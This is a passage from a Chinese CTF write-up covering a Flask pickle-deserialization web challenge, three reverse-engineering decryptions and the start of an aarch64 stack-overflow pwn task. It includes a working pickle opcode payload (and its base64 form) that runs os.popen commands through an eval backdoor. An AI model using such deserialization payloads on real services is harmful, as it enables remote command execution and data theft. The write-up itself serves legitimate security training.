class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="comment"># 这里我也改了一下</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>flask框架，用到python反序列化，参考<a href="https://www.ieven762.cn/index.php/archives/109/">巅峰极客2021 - what_pickle</a>，限制了加载的模块只能为 <code>config</code> 里的，名字不能有 <code>__</code>，但是可以通过 <code>config</code> 的 <code>backdoor(cmd)</code> 函数绕过。</p><p>这题简化了 <code>backdoor(cmd)</code> 函数的使用条件，直接调用即可。利用pker构造opcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;</span></span><br><span class="line"><span class="string">lo.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>base64编码opcode，传参：</p><p><code>data=KGNjb25maWcKYmFja2Rvb3IKKFMnX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKScKbG8u</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="simpleXOR"><a href="#simpleXOR" class="headerlink" title="simpleXOR"></a>simpleXOR</h3><blockquote><p>简单的加密</p></blockquote><p><code>main()</code> 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-160h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">52</span>]; <span class="comment">// [rsp+120h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+154h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+15Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">247</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[i + <span class="number">36</span>] = v5[i];</span><br><span class="line">    v4[i] = v6 ^ (v4[i + <span class="number">36</span>] + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x23</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != result_0[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( j == <span class="number">35</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success!!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先加下标值再异或247，最后校验密文，简单还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">179</span>, <span class="number">145</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">195</span>, <span class="number">155</span>, <span class="number">206</span>, <span class="number">117</span>, <span class="number">207</span>, <span class="number">156</span>, <span class="number">154</span>, <span class="number">133</span>, <span class="number">133</span>, <span class="number">205</span>, <span class="number">184</span>, <span class="number">132</span>, <span class="number">170</span>, <span class="number">125</span>, <span class="number">189</span>, <span class="number">187</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">150</span>, <span class="number">113</span>, <span class="number">141</span>, <span class="number">158</span>, <span class="number">134</span>, <span class="number">191</span>, <span class="number">115</span>, <span class="number">168</span>, <span class="number">163</span>, <span class="number">156</span>, <span class="number">131</span>, <span class="number">101</span>, <span class="number">158</span>, <span class="number">87</span>]</span><br><span class="line">flag = [(c[i]^<span class="number">247</span>)-i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h3><p><code>main()</code> 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> enc[<span class="number">45</span>]; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>]; <span class="comment">// [rsp+40h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">  *(_QWORD *)enc = <span class="number">0x9F8E7A1CC6486497</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">8</span>] = <span class="number">0x69EEF382E760BD46</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">16</span>] = <span class="number">0xB9C017E2E30EF749</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">24</span>] = <span class="number">0x98410148A430392C</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">32</span>] = <span class="number">0xE80E7411E5B5A939</span>LL;</span><br><span class="line">  *(_DWORD *)&amp;enc[<span class="number">40</span>] = <span class="number">0xA58BFDAC</span>;</span><br><span class="line">  enc[<span class="number">44</span>] = <span class="number">109</span>;</span><br><span class="line">  fwrite(<span class="string">&quot;input: &quot;</span>, <span class="number">1uLL</span>, <span class="number">7uLL</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  fgets(str, <span class="number">46</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(str) != <span class="number">45</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">23</span> * str[i];</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) != enc[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密逻辑中 <code>((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24)</code> 互减抵消，剩下 <code>23 * str[i] + x[i] == enc[i]</code>，简单还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">enc = [<span class="number">151</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">198</span>, <span class="number">28</span>, <span class="number">122</span>, <span class="number">142</span>, <span class="number">159</span>, <span class="number">70</span>, <span class="number">189</span>, <span class="number">96</span>, <span class="number">231</span>, <span class="number">130</span>, <span class="number">243</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">73</span>, <span class="number">247</span>, <span class="number">14</span>, <span class="number">227</span>, <span class="number">226</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">44</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">164</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">65</span>, <span class="number">152</span>, <span class="number">57</span>, <span class="number">169</span>, <span class="number">181</span>, <span class="number">229</span>, <span class="number">17</span>, <span class="number">116</span>, <span class="number">14</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">253</span>, <span class="number">139</span>, <span class="number">165</span>, <span class="number">109</span>]</span><br><span class="line">x = [<span class="number">123</span>, <span class="number">81</span>, <span class="number">243</span>, <span class="number">90</span>, <span class="number">204</span>, <span class="number">57</span>, <span class="number">249</span>, <span class="number">146</span>, <span class="number">28</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">247</span>, <span class="number">253</span>, <span class="number">74</span>, <span class="number">62</span>, <span class="number">251</span>, <span class="number">29</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">12</span>, <span class="number">112</span>, <span class="number">177</span>, <span class="number">59</span>, <span class="number">141</span>, <span class="number">37</span>, <span class="number">237</span>, <span class="number">145</span>, <span class="number">177</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">130</span>, <span class="number">230</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">32</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">166</span>, <span class="number">157</span>, <span class="number">50</span>]</span><br><span class="line">flag = [((enc[i]-x[i])*gmpy2.invert(<span class="number">23</span>,<span class="number">256</span>))%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZMATH"><a href="#EZMATH" class="headerlink" title="EZMATH"></a>EZMATH</h3><p>ILSpy查看dll文件，主要逻辑代码：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;Main&gt;$(<span class="built_in">string</span>[] args)</span><br><span class="line">&#123;</span><br><span class="line">Console.Write(<span class="string">&quot;Input your flag:&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> text = Console.ReadLine();</span><br><span class="line"><span class="keyword">if</span> (!FormatChecker(text))</span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> s = text.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty);</span><br><span class="line"><span class="built_in">byte</span>[] second = Checker.Encrypt2(Checker.Encrypt1(Encoding.ASCII.GetBytes(s)));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>,</span><br><span class="line"><span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>,</span><br><span class="line"><span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>,</span><br><span class="line"><span class="number">227</span>, <span class="number">109</span></span><br><span class="line">&#125;.SequenceEqual(second))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Your flag is Dest0g3&#123;&quot;</span> + text + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">err</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;err!&quot;</span>);</span><br><span class="line">Environment.Exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">FormatChecker</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Guid result;</span><br><span class="line"><span class="keyword">return</span> Guid.TryParse(input, <span class="keyword">out</span> result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt1</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> <span class="keyword">value</span> = (<span class="built_in">uint</span>)((<span class="built_in">ulong</span>)((<span class="built_in">long</span>)utils.Unpack32(a[(<span class="number">4</span> * i)..(<span class="number">4</span> * (i + <span class="number">1</span>))]) * <span class="number">83987L</span>) % <span class="number">4062393413u</span>L);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt2</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ulong</span> num = utils.Unpack64(a[(<span class="number">8</span> * i)..(<span class="number">8</span> * (i + <span class="number">1</span>))]);</span><br><span class="line"><span class="built_in">ulong</span> <span class="keyword">value</span> = num ^ (num &gt;&gt; <span class="number">25</span>);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入字符串先经 <code>Encrypt1()</code> 以32位形式4位一组做乘法取模运算，再经 <code>Encrypt2()</code> 以64位形式8位一组做xorshift运算，逐步还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>, <span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>, <span class="number">227</span>, <span class="number">109</span>]</span><br><span class="line"></span><br><span class="line">c1 = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_right</span>(<span class="params">m,l</span>):</span></span><br><span class="line">    length = <span class="number">64</span></span><br><span class="line">    mx = (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span></span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * l &lt; length:</span><br><span class="line">        mask = (mx &lt;&lt; (length - l) &amp; mx) &gt;&gt; i * l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m = m ^ tmp &gt;&gt; l &amp; mx</span><br><span class="line">        res += tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">c2 = [invert_right(c1[i], <span class="number">25</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">c3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    c3 += <span class="built_in">list</span>(long_to_bytes(c2[i]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">c4 = [bytes_to_long(<span class="built_in">bytes</span>(c3[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">c4 = [(k*inverse(<span class="number">83987</span>,<span class="number">4062393413</span>))%<span class="number">4062393413</span> <span class="keyword">for</span> k <span class="keyword">in</span> c4]</span><br><span class="line"></span><br><span class="line">c5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    c5 += <span class="built_in">list</span>(long_to_bytes(c4[i]))[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c5))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;28956fc4c54045a8808d42a5fab4b5f8&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_8EC();</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s just a easy stack overflow.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fun2();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">fun2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"> </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please leave your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK, you can exploit it now.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK, you get it !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>arm的aarch64架构，开了PIE，与后门地址比较发现只有后1个字节不同，把返回地址的尾1字节改为后门地址尾1字节，简单栈溢出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 